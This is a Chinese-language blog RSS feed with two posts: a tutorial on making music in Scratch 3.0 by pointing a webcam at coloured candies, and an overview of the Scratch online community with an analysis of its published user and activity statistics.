<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"><channel><title>writing for time</title><link>/</link><description></description><lastBuildDate>Wed, 08 Aug 2018 00:00:00 +0000</lastBuildDate><item><title>彩虹🌈的旋律</title><link>/scratch3-rainbow.html</link><description>&lt;blockquote&gt;
&lt;p&gt;阳光总在风雨后, 请相信有彩虹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/rainrow_324b7eb0.png" /&gt;&lt;/p&gt;
&lt;p&gt;我喜欢这个粉色少女心的题目&lt;/p&gt;
&lt;h1&gt;演示&lt;/h1&gt;
&lt;p&gt;我们先来看看演示效果：在桌子上一字排开彩虹糖，按照你喜欢的颜色去摆放，这些彩虹糖将被演奏为一首音乐&lt;/p&gt;
&lt;video width=600px src="http://p6ur0vhyj.bkt.clouddn.com/scratch_rainrow.mp4" controls="controls"&gt;&lt;/video&gt;

&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;我非常喜欢Scratch团队成员&lt;a href="https://github.com/ericrosenbaum"&gt;Eric Rosenbaum&lt;/a&gt;发起的&lt;a href="https://www.ericrosenbaum.com/color-code/"&gt;颜色编程&lt;/a&gt;项目。&lt;a href="https://www.ericrosenbaum.com/color-code/"&gt;颜色编程&lt;/a&gt;的基本想法是使用日常物体表面的颜色与计算机中的虚拟事物进行互动&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.ericrosenbaum.com/color-code/"&gt;颜色编程&lt;/a&gt;由一系列的实验构成:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Twinkle&lt;/li&gt;
&lt;li&gt;Color Code&lt;/li&gt;
&lt;li&gt;Scratch Color Code&lt;/li&gt;
&lt;li&gt;Programming with Color&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们下边将逐一做个简单介绍&lt;/p&gt;
&lt;!--
写给普通用户
在scratch社区去推广
--&gt;

&lt;!--腾讯视频--&gt;

&lt;h3&gt;Twinkle&lt;/h3&gt;
&lt;p&gt;Twinkle 使用一个颜色传感器将颜色序列转化为一首旋律，于是你可以将一幅画、一个乐高建筑以及你身上衬衫上的条纹演奏为一首歌&lt;/p&gt;
&lt;video width=500px src="http://os54tv4fc.bkt.clouddn.com/10697723.mp4" controls="controls"&gt;&lt;/video&gt;

&lt;h3&gt;Color Code&lt;/h3&gt;
&lt;p&gt;Color Code 的想法是: 物体的颜色可以控制屏幕里的运动，于是你可以利用这个概念创造从乒乓球游戏、音序器以及人工生命模拟。&lt;/p&gt;
&lt;video width=600px src="http://os54tv4fc.bkt.clouddn.com/Color%20Code.mp4" controls="controls"&gt;&lt;/video&gt;

&lt;h3&gt;Scratch Color Code&lt;/h3&gt;
&lt;p&gt;Scratch Color Code则将Color Code的想法带入到Scratch中，如此一来，人们可以使用友好的scratch图形化编程环境来创建项目，与外部世界的彩色物体交互&lt;/p&gt;
&lt;p&gt;视频里展示的例子包括一个cookie怪物游戏、一个叶子平台游戏，以及一个糖果鼓机(candy drum machine)&lt;/p&gt;
&lt;video width=600px src="http://os54tv4fc.bkt.clouddn.com/Scratch%20Color%20Code.mp4" controls="controls"&gt;&lt;/video&gt;

&lt;h3&gt;Programming with Color&lt;/h3&gt;
&lt;p&gt;Programming with Color将前头的概念延伸到最远处:使用颜色来编程，用Scratch Color Code来创造一个微型编程语言，在这门语言里颜色代表着指令。&lt;/p&gt;
&lt;video width=600px src="http://os54tv4fc.bkt.clouddn.com/Programming%20with%20color.mp4" controls="controls"&gt;&lt;/video&gt;

&lt;p&gt;这是个极为有趣的想法，我们来看看这个想法的细节&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个小角色在屏幕移动，画出一条线；&lt;/li&gt;
&lt;li&gt;一个黑色箭头在屏幕的底部，从左向右滑动，读取由彩色物体组成的“程序”。&lt;/li&gt;
&lt;li&gt;当黑色箭头碰到红色时，小角色向右转。&lt;/li&gt;
&lt;li&gt;当黑色箭头碰到绿色时，小角色正在绘制的线条会改变颜色。&lt;/li&gt;
&lt;li&gt;箭头碰到黄色时小角色向左转，碰到蓝色时小角色回到初始位置重新开始。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这是一种有形的编程语言，指令由对象表示，即便在程序运行时也可以重新排列程序(如果你是一名职业程序员，可能想到了热重载或者LISP)。&lt;/p&gt;
&lt;p&gt;与其他有形编程语言不同的是，指令块可以由任何对象来表示，不必是特定的指令块，只要颜色对了就行。对比&lt;a href="https://4ok.jp/pets/en/"&gt;PETS&lt;/a&gt;和&lt;a href="https://www.primotoys.com/zh/"&gt;Cubetto&lt;/a&gt;，我们可以看到它们的目标上的相似，以及策略上的差别&lt;/p&gt;
&lt;p&gt;与其他编程语言不同，Programming with Color的指令具有连续的效应，举例来说明：红色物体越宽，角色右转的时间越长。&lt;/p&gt;
&lt;p&gt;这些属性为创造新的编程语言提供了一些有趣的探索。&lt;/p&gt;
&lt;h1&gt;Scratch颜色编程&lt;/h1&gt;
&lt;p&gt;本文主要受&lt;code&gt;Scratch Color Code&lt;/code&gt;的启发，准备在最新发布的Scratch3.0，使用彩虹糖来演奏乐曲，这便是少女心题目&lt;code&gt;彩虹的旋律&lt;/code&gt;之来由&lt;/p&gt;
&lt;h3&gt;原理&lt;/h3&gt;
&lt;p&gt;在&lt;code&gt;Programming with Color&lt;/code&gt;部分其实已经将原理说清楚了，在此我们将原理与当前项目:&lt;code&gt;彩虹🌈的旋律&lt;/code&gt;结合起来说明&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;彩虹糖在桌子上排成一列，使用摄像头对着它们, 彩虹糖被投影到scratch舞台&lt;/li&gt;
&lt;li&gt;一个粉色箭头在屏幕中间，从左向右滑动&lt;/li&gt;
&lt;li&gt;当粉色箭头碰到不同颜色的彩虹糖时，演奏不同旋律的音符&lt;/li&gt;
&lt;/ol&gt;
&lt;!--

学习音乐 note

音符
    https://en.scratch-wiki.info/wiki/MIDI_Notes
    c 60 62 64 65 67 69 71  

颜色编程 .sb3 

,你也可以将彩虹糖视为指令颗粒，用它来编程
--&gt;

&lt;p&gt;接着，让我们一起动起手来&lt;/p&gt;
&lt;h3&gt;需要的材料&lt;/h3&gt;
&lt;p&gt;&lt;img width=500px src="http://oav6fgfj1.bkt.clouddn.com/candy_410c19cf.png"/&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一些彩虹糖&lt;/li&gt;
&lt;li&gt;一个usb摄像头&lt;/li&gt;
&lt;li&gt;一台笔记本电脑(安装chrome浏览器)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Do-Re-Mi&lt;/h3&gt;
&lt;p&gt;让我们从音乐届的&lt;code&gt;hello world&lt;/code&gt;开始： 演奏:&lt;code&gt;Do Re Mi&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;回顾下原理，看看我们都需要做些什么：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;彩虹糖在桌子上排成一列，使用摄像头对着它们, 彩虹糖被投影到scratch舞台&lt;/li&gt;
&lt;li&gt;一个粉色箭头在屏幕中间，从左向右滑动&lt;/li&gt;
&lt;li&gt;当粉色箭头碰到不同颜色的彩虹糖时，演奏不同旋律的音符&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;动起手来，首先取出三种颜色的彩虹糖，在桌子上摆开，使用摄像头对着它们，我原先准备使用乐高积木搭建一个摄像头支架，由于心急想快些看到效果，于是我给了我同事一颗彩虹糖，让他帮我拿着USB摄像头&lt;/p&gt;
&lt;p&gt;摆好彩虹糖和摄像头后，就可以开始在&lt;a href="https://beta.scratch.mit.edu/"&gt;scratch&lt;/a&gt;里开始编写程序了&lt;/p&gt;
&lt;p&gt;接下来需要在scratch的角色库里选择一个粉色箭头精灵，只所以把他们称为精灵，是因为游戏里的角色在传统上都被称为精灵。&lt;/p&gt;
&lt;p&gt;&lt;img width=600px src="http://oav6fgfj1.bkt.clouddn.com/scratch_rainrow_91b32f58.png"/&gt;&lt;/p&gt;
&lt;p&gt;聪明的你可能要打破沙锅，问为何它们在传统上会被称为精灵呢？我想，可能是因为这些角色和童话里的精灵一样，它们会运动，会生气，会砰地一声消失不见。你通过编程来操控这些精灵，就这点来说，编程和魔法是很相似的，这是个很好的隐喻。你写出一串咒语，然后故事里的精灵就动了起来、远处的灯亮了、而手中的飞行器嗖地飞上了天，这是今天利用程序能做到的事，在&lt;code&gt;很久很久以前的&lt;/code&gt;这种开头的故事里，这种事情往往是魔法师的专属权力。我相信今天程序做到的事情，会让历史上每一位伟大的巫师/魔法师大为震惊，这些魔法师不只是大卫·科波菲尔，也包括哈利.波特&lt;/p&gt;
&lt;p&gt;选择好精灵之后，我们就开始来为精灵编程了，在开始编写程序之前，我们先想想我们希望精灵做什么事呢&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;一个粉色箭头在屏幕中间，从左向右滑动，读取由彩虹糖组成的“程序”。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们希望粉色箭头在屏幕中间从左向右滑动，目标明确之后，我们就开始动手写程序&lt;/p&gt;
&lt;p&gt;&lt;img width=600px src="http://oav6fgfj1.bkt.clouddn.com/scratch_rainrow_17ae4f7d.png"/&gt;&lt;/p&gt;
&lt;p&gt;上边这段程序表达的意思是:&lt;code&gt;箭头&lt;/code&gt;不断往右边移动，如果到了舞台边缘就回到初始位置。怎么知道哪儿是舞台边缘呢？这就是程序里看起来奇怪的数字&lt;code&gt;212&lt;/code&gt;出现的原因。212是&lt;code&gt;坐标&lt;/code&gt;值，如果你不知道坐标的概念也没关系，知道212表示&lt;code&gt;舞台上右边缘的位置&lt;/code&gt;就行。写出有趣的程序和数学好不好并没什么太大关系，别听信大家恐吓你数学不好就学不好编程。如果你喜欢编程，你的数学很可能会得到提高，但你目前的数学不好却不意味着你不适合编程，它可能更多意味着你的数学老师上课太无聊。数学课大多情况下总是那么无聊，这也是我们喜欢在编程中学习的原因&lt;/p&gt;
&lt;p&gt;运行程序，我们就看到箭头完成了我们期望它做的事情：不断从左往右滑动&lt;/p&gt;
&lt;p&gt;&lt;img width=600px src="http://os54tv4fc.bkt.clouddn.com/%E5%BD%A9%E8%99%B9%E7%B3%96_arrow2.gif"/&gt;&lt;/p&gt;
&lt;p&gt;下边来实现最后一步&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;当粉色箭头碰到不同颜色的彩虹糖时演奏不同旋律的音符&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;为了实现这一步，我们需要先启用摄像头，让糖果投影到屏幕上, 首先选择scratch扩展里的&lt;code&gt;视频侦测&lt;/code&gt;插件&lt;/p&gt;
&lt;p&gt;&lt;img width=600px src="http://oav6fgfj1.bkt.clouddn.com/scratch_rainrow_11d35b9d.png"/&gt;&lt;/p&gt;
&lt;p&gt;接着编写碰到不同颜色时演奏不同旋律的代码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;黄色对应"Do"&lt;/li&gt;
&lt;li&gt;橙色对应"Re"&lt;/li&gt;
&lt;li&gt;褐色对应"Mi"&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img width=600px src="http://oav6fgfj1.bkt.clouddn.com/scratch_rainwor_e87b2bf8.png"/&gt;&lt;/p&gt;
&lt;p&gt;现在就可以开始&lt;code&gt;Do Re Mi&lt;/code&gt;的演奏啦：&lt;/p&gt;
&lt;video width=600px src="http://os54tv4fc.bkt.clouddn.com/%E5%BD%A9%E8%99%B9%E7%B3%96123.mp4" controls="controls"&gt;&lt;/video&gt;

&lt;h3&gt;欢乐颂&lt;/h3&gt;
&lt;p&gt;我们来演奏贝多芬《欢乐颂》的开头: &lt;code&gt;33455432&lt;/code&gt;&lt;/p&gt;
&lt;video width=600px src="http://p6ur0vhyj.bkt.clouddn.com/scratch_rainrow.mp4" controls="controls"&gt;&lt;/video&gt;

&lt;p&gt;挑一首你自己喜欢的乐曲，试着用彩虹糖演奏它&lt;/p&gt;
&lt;h1&gt;想象空间&lt;/h1&gt;
&lt;p&gt;程序是一种指令序列，上边的教程里，我们已经学会了将彩虹糖映射为一个指令(演奏旋律)，我们当然也可以将彩虹糖映射为其他指令，诸如&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;映射为画笔移动&lt;/li&gt;
&lt;li&gt;映射为机器人的移动&lt;/li&gt;
&lt;li&gt;映射为智能家居的设备行为&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如此一来我们就可以在桌子上摆放彩虹糖，去探索绘画、音乐和改造你的家庭&lt;/p&gt;
&lt;p&gt;我们甚至可以用彩虹糖去制作了一门新的编程语言： &lt;code&gt;Candy Language&lt;/code&gt;&lt;/p&gt;
&lt;!--
### cozmo
[PETS](https://4ok.jp/pets/en/)

我之前实验python写过一个简单的[pets模拟器](https://gist.github.com/wwj718/3ade708bc6e7f3cf669dc38a998000cd)

控制cozmo 移动  前后左右（四种颜色） 实验adapter

我们


整个游戏过程都鼓励小朋友多尝试。移动方块，按按按钮，看看会发生什么？

Cubetto 和 Geppetto（制造匹诺曹的老爷爷）押韵。

Cubetto 套件抛弃了屏幕

### 增强现实
[COLOR CODE](https://www.ericrosenbaum.com/color-code/)
--&gt;

&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ericrosenbaum.com/color-code/"&gt;COLOR CODE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://musiclab.chromeexperiments.com/About"&gt;musiclab&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.primotoys.com/zh/"&gt;primotoys&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tech2ipo.com/10020774"&gt;如何教 3 岁小孩学编程，不用电脑&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://sonic-pi.net/"&gt;sonic-pi&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 08 Aug 2018 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2018-08-08:scratch3-rainbow.html</guid><category>scratch</category></item><item><title>scratch社区一览</title><link>/scratch-community-analyze.html</link><description>&lt;p&gt;&lt;img alt="主页" src="http://oav6fgfj1.bkt.clouddn.com/scratch_c_4915ab49.png" width=600 /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Imagine, Program, Share&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;维基百科的&lt;code&gt;scratch&lt;/code&gt;词条里提到:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Scratch 设立了一个线上社群，其口号为“想像･程序･分享”，分享和创意是 Scratch 最重要的理念...线上社群中有不同类型的项目，范围包括游戏、动画、演示稿和聊天机器人。所有项目都以知识共享的特许方式发布&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;scratch社区是目前编程领域最庞大也最为活跃的社区之一，在少儿编程领域，更是一骑绝尘&lt;/p&gt;
&lt;p&gt;本文将对scratch社区做一番介绍，带领大家一览社区风采；同时我们也关心scratch社区的一些量化数据，并据此做一些解读和分析&lt;/p&gt;
&lt;p&gt;本文不是一篇scratch入门教程，入门引导可以参考&lt;a href="https://scratch.mit.edu/projects/236614170/#editor"&gt;开始使用 Scratch&lt;/a&gt;。 如果你对scratch的诞生和背后故事感兴趣，可以参考:&lt;a href="https://blog.just4fun.site/scratch.html"&gt; Scratch的前世今生&lt;/a&gt;&lt;/p&gt;
&lt;!--作为《少儿编程指北》的第一篇文章--&gt;

&lt;h1&gt;走进scratch社区&lt;/h1&gt;
&lt;p&gt;MIT媒体实验室(&lt;a href="https://www.media.mit.edu/"&gt;Media Lab&lt;/a&gt;)主任&lt;a href="https://zh.wikipedia.org/zh-hans/%E4%BC%8A%E8%97%A4%E7%A9%B0%E4%B8%80"&gt;伊藤穰一&lt;/a&gt;在《爆裂》一书里提到:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这个软件大受欢迎背后的真正原因是：一个全球范围的孩子社区，他们在其中分享建议、评论，同时支持Scratch的一项特殊功能——合成（Remix），即他们作品背后的源代码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;&lt;a href="https://scratch.mit.edu/community_guidelines"&gt;scratch社区准则&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;scratch社区的繁荣离不开&lt;a href="https://scratch.mit.edu/community_guidelines"&gt;scratch社区准则&lt;/a&gt;，正如一个国家的繁荣离不开它的法律保障，也正是如此，&lt;a href="https://zh.wikipedia.org/zh/%E6%A2%AD%E4%BC%A6"&gt;梭伦&lt;/a&gt;作为立法者，为雅典人民所铭记&lt;/p&gt;
&lt;p&gt;我们来看看scratch社区有哪些&lt;a href="https://scratch.mit.edu/community_guidelines"&gt;准则&lt;/a&gt;: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;我们需要彼此协助，才能让 Scratch 成为一个友善与富创造力的社区，我们欢迎不同背景与兴趣的人加入。

要有礼貌。
在分享项目或是发表评论时，请考虑到观看的人们遍布各个年龄层、来自不同生活背景。

我们富有建设性。
在别人的项目上发表时，说说你喜欢这个项目的原因，也给予一些建议。

共享
您可以自由的改编，像是构想、图案…任何 Scratch 项目中找到的东西都可以。不过，要记得尊重并感谢别人，你分享的项目也有可能会有被改编的时候。

将个人信息设为不公开。
基于安全性，请不要提供任何可用于私人通信的信息，例如真实姓名、电话、住址、信箱、社交媒体账号、或是聊天网站。

要有诚信。
不要冒充其他 Scratcher，或是随意散播谣言，甚至做欺骗整个社区的事情。

我们帮助维护站点的友好性。
如果你认为项目或评论的内容不恰当，像是过于血腥、暴力、色情，你可以点击「检举」按钮让我们处理。

任何人都可使用 Scratch，不分性别、年龄、种族、信仰和能力。
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这些准则写得十分富有智慧，保障了社区活跃而友好的气氛&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://scratch.mit.edu/"&gt;社区主页&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;scratch&lt;a href="https://scratch.mit.edu/"&gt;社区主页&lt;/a&gt;如图所示：&lt;/p&gt;
&lt;p&gt;&lt;img alt="主页" src="http://oav6fgfj1.bkt.clouddn.com/scratch_c_4915ab49.png" width=600 /&gt;&lt;/p&gt;
&lt;p&gt;以下是我登陆之后，所看到的内容:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;正在发生的事？ : 显示了Scratchers最近的活动&lt;/li&gt;
&lt;li&gt;Scratch新闻 : Scratch团队在这里发布短消息&lt;/li&gt;
&lt;li&gt;精选项目:  Scratch团队所喜欢的项目&lt;/li&gt;
&lt;li&gt;特色工作室: 由Scratch团队挑选出的工作室&lt;/li&gt;
&lt;li&gt;PillowySleep挑选的项目:  由&lt;a href="https://en.scratch-wiki.info/wiki/Curator_(front_page)"&gt;策展人&lt;/a&gt;整理的项目，策展人有期任期&lt;/li&gt;
&lt;li&gt;Scratch设计室 - From Dusk 'Till Dawn:  随机显示当前Scratch Design Studio中的一些项目&lt;/li&gt;
&lt;li&gt;关注的工作室的项目:  与当前登录用户有关&lt;/li&gt;
&lt;li&gt;大家在改编的项目:  显示过去十天内被改编(Remix)最多的项目&lt;/li&gt;
&lt;li&gt;大家在赞的项目:  显示了过去十天中最受欢迎的项目&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a href="https://scratch.mit.edu/explore/projects/all"&gt;发现页&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;主页给用户推可送Ta可能感兴趣的项目(有点feed流的意味)，如果用户意犹未尽，可以进入&lt;a href="https://scratch.mit.edu/explore/projects/all"&gt;发现页&lt;/a&gt;去探索海量的社区作品，截止到今天(2018.07.18)，scratch社区里一共有&lt;code&gt;2930万&lt;/code&gt;用户分享了&lt;code&gt;3275万&lt;/code&gt;个项目。稍后我们将结合scratch的后台运营数据，做一些有趣的分析。&lt;/p&gt;
&lt;p&gt;发现页包含七个标签:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;全部&lt;/li&gt;
&lt;li&gt;动画&lt;/li&gt;
&lt;li&gt;艺术&lt;/li&gt;
&lt;li&gt;游戏&lt;/li&gt;
&lt;li&gt;音乐&lt;/li&gt;
&lt;li&gt;故事&lt;/li&gt;
&lt;li&gt;教程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;你可以选择标签查看对应分类的项目。&lt;/p&gt;
&lt;p&gt;&lt;a href="https://scratch.mit.edu/explore/projects/all"&gt;发现页&lt;/a&gt;鼓励你去发现有趣的&lt;a href="https://scratch.mit.edu/explore/projects/all/"&gt;项目&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="projects" src="http://oav6fgfj1.bkt.clouddn.com/scratch_c_c4943467.png" width=600 /&gt;&lt;/p&gt;
&lt;p&gt;我们之前用Python写了个&lt;a href="https://zh.wikipedia.org/zh-hans/%E7%B6%B2%E8%B7%AF%E7%88%AC%E8%9F%B2"&gt;爬虫&lt;/a&gt;，爬取了&lt;a href="https://scratch.mit.edu/explore/projects/all/"&gt;项目&lt;/a&gt;每个标签下前9000个最流行的项目，共计5万余个。之后使用python对这些数据做了简单的分析和数据可视化，发现不少有趣的东西，这部分之后有机会单独写一篇文章来讨论&lt;/p&gt;
&lt;p&gt;发现页也鼓励你去寻找有趣的&lt;a href="https://scratch.mit.edu/explore/studios/all/"&gt;工作室&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="studio" src="http://oav6fgfj1.bkt.clouddn.com/scratch_c_1d42cc6d.png " width=600 /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://en.scratch-wiki.info/wiki/Studio"&gt;工作室&lt;/a&gt;可以将多个项目汇集在一起(可以视为一个收藏夹)。在Scratch 2.0之前，被称为galleries。大多数工作室都有一个特定的项目主题，诸如&lt;a href="https://scratch.mit.edu/studios/5047558/"&gt;Scratch Day Celebrations!&lt;/a&gt;汇集了Scratch Day庆祝活动相关的项目；而&lt;a href="https://scratch.mit.edu/studios/4982024/"&gt;Earth Day 2018&lt;/a&gt;汇集了2018地球日相关的项目:&lt;/p&gt;
&lt;p&gt;&lt;img alt="studio" src="http://oav6fgfj1.bkt.clouddn.com/scratch_studio_21efe52b.png" width=600 /&gt;&lt;/p&gt;
&lt;!--
主题
    介绍以及如何使用这个社区
    不讨论如何使用scratch

内举不避亲 adapter

scratch社区是目前，少儿编程社区

--&gt;

&lt;h1&gt;社区的运营数据&lt;/h1&gt;
&lt;p&gt;简单介绍完社区，接着让我们根据scratch的&lt;a href="https://scratch.mit.edu/statistics/"&gt;后台运营数据&lt;/a&gt;，来对社区做个定量的了解。scratch团队公开了他们十多年来的运营数据。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;:  数据采集的时间为本文写作时间: 2018.07.18&lt;/p&gt;
&lt;!--

https://scratch.mit.edu/statistics/data/monthly/
    age_distribution_data
    使用jupyter做些分析
        requests拿到json
--&gt;

&lt;h3&gt;统计概览&lt;/h3&gt;
&lt;p&gt;scratch社区包含:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;3275万 个分享项目&lt;/li&gt;
&lt;li&gt;2931万 名注册用户&lt;/li&gt;
&lt;li&gt;1亿6259万 条评论&lt;/li&gt;
&lt;li&gt;467万 个工作室&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;2018年6月份网站流量&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;2亿5410万 页面浏览次数&lt;/li&gt;
&lt;li&gt;4652万 网站访问次数&lt;/li&gt;
&lt;li&gt;2343万 访客人数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;scratch社区不愧是曾拖垮MIT学校内网的项目 :）&lt;/p&gt;
&lt;h3&gt;月活动趋势&lt;/h3&gt;
&lt;p&gt;&lt;img alt="studio" src="http://oav6fgfj1.bkt.clouddn.com/scratch_data_08b8c476.png" width=800 /&gt;&lt;/p&gt;
&lt;p&gt;从图中我们可以看出，2018年5月份：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新增项目 115万&lt;/li&gt;
&lt;li&gt;新增用户 113万&lt;/li&gt;
&lt;li&gt;新增评论 378万&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;从新增评论数可以看出，社区非常活跃&lt;/p&gt;
&lt;p&gt;新增项目、新增用户、新增评论三条曲线几乎保持同步，这也在情理之中&lt;/p&gt;
&lt;p&gt;从图中我们还可看出，2013.05对社区来说是个关键节点，从这个时间节点之后，社区用户迅速增长。我暂时还不清楚2013年的夏天scratch团队如何如此有力地推动社区的发展，了解这段历史的小伙伴欢迎来补充。&lt;/p&gt;
&lt;h3&gt;月活跃用户&lt;/h3&gt;
&lt;p&gt;&lt;img alt="studio" src="http://oav6fgfj1.bkt.clouddn.com/scratch_data_a256ba33.png" width=800 /&gt;&lt;/p&gt;
&lt;p&gt;从图中发现有个现象很有趣，每年的5-8月份，社区活跃度开始下降，8月份之后才开始回升&lt;/p&gt;
&lt;p&gt;我们综合社区发布的所有数据来推测一下原因: 从scratch社区用户空间分布我们得知，社区用户主体在美国(46.14%),接近总体用户的一半;  从用户年龄分布我们得知，80%以上的用户处于k12阶段(下文有详细数字)，接着查阅美国的中小学学期表，我们发现，美国中小学从5月下旬开始陆续放假，到9月份开学(和中国类似)。由此我猜测，美国学生多数在假期里放下了学习。想来是没什么scratch暑期补习班的&lt;/p&gt;
&lt;p&gt;这个现象可能给美国面向K12的编程教育公司的启示是:  暑假期间不宜做活动和宣传，用户参与度不高&lt;/p&gt;
&lt;h3&gt;用户年龄分布&lt;/h3&gt;
&lt;p&gt;&lt;img alt="studio" src="http://oav6fgfj1.bkt.clouddn.com/scratch_data_997edfe4.png" width=600 /&gt;&lt;/p&gt;
&lt;!--写个server 查询区间人数--&gt;

&lt;p&gt;用户数随年龄的分布呈钟形曲线&lt;/p&gt;
&lt;p&gt;我在jupyter中用Python拿到原始数据之后，做了些简单的数据分析，发现不少有趣的信息:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;社区里，12岁用户人群最大，有301.8万，占总用户数的11.1%&lt;/li&gt;
&lt;li&gt;K–12(从幼儿园（Kindergarten，通常5-6岁）到十二年级（grade 12，通常17-18岁）)用户人群是scratch社区的主体，人数为2220.8万，占总人数的81.7%&lt;/li&gt;
&lt;li&gt;scratch宣称主要为8-16的孩子设计。从数据中我们看到，这个人群的数量为1841万,比例占全体的67.7%&lt;/li&gt;
&lt;li&gt;8岁以下的低龄用户达124万。随着为低龄化用户设计的scratchjr的流行，低龄用户比例应该还会降低。&lt;/li&gt;
&lt;li&gt;从图中，我们看到18岁用户人数很突兀，按照钟形曲线的趋势，18岁用户人群数，应该在90万左右，但实际人数竟达到了204万,2倍不只于预期人数。我对美国的教育不大了解，此中原因我还猜不出&lt;/li&gt;
&lt;li&gt;18岁以上的成年用户，有695万，超过总人数的四分之一，由此可见，scratch远不只是少儿编程社区&lt;/li&gt;
&lt;li&gt;社区用户年龄的中位数为14岁。社区用户的平均年龄为16.3岁&lt;/li&gt;
&lt;li&gt;令人震惊的是，年龄60岁以上的用户竟也有16万！不禁令人想到scratch之父在&lt;a href="blob:https://embed.ted.com/607e7bc6-7a0d-4a69-8463-dc45bcfa8462"&gt;Learn to Code, Code to Learn&lt;/a&gt;中提到，他年迈的老母亲在他生日的时候，用scratch制作了一张电子贺卡送给他&lt;/li&gt;
&lt;li&gt;80岁用户有2473人！&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;用户空间分布&lt;/h3&gt;
&lt;p&gt;&lt;img alt="studio" src="http://oav6fgfj1.bkt.clouddn.com/scratch_data_014a18d3.png" width=600 /&gt;&lt;/p&gt;
&lt;p&gt;从图中我们可以看出，社区用户主体在美国(46.14%),接近总体用户的一半。&lt;/p&gt;
&lt;p&gt;中国用户数为31.6万，占社区用户的1.09%&lt;/p&gt;
&lt;p&gt;根据我所了解的一些信息，我猜测国内使用scratch的用户不只十倍于这个数量，他们没有进入scratch社区可能的原因有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;国内网络访问社区不流畅&lt;/li&gt;
&lt;li&gt;使用scratch的离线版本&lt;/li&gt;
&lt;li&gt;用户被分流到国内不同平台&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;每月项目分享情况&lt;/h3&gt;
&lt;p&gt;&lt;img alt="studio" src="http://oav6fgfj1.bkt.clouddn.com/scratch_data_b58c596d.png" width=800 /&gt;&lt;/p&gt;
&lt;p&gt;从图中我们可以看出，新增的改编(Remix)项目 略多于 新增白板项目 的1/3，社区成员积极地利用社区已有项目来开展自己的工作，我觉得这是个很好的现象。&lt;/p&gt;
&lt;p&gt;但这个比例不算太高，远低于github社区里的代码重用率，github社区成员重用了社区里80%以上的代码（2017年数据）。其中的原因有很多，它向我们揭示了scratch社区的一些不足，也给我们指明了改进scratch社区的一些方向: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如何让用户更容易找到与它们目标相关的项目，以便于他们能在他人工作的基础上开始新的编程。&lt;/li&gt;
&lt;li&gt;如何更方便地重用代码，目前只有Remix一条策略，积木化代码难以片段式地复制和重用&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我想到一些改进的思路和策略，包括:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;引入自然语言分析、图像识别以及增强推荐系统来解决第一个问题&lt;/li&gt;
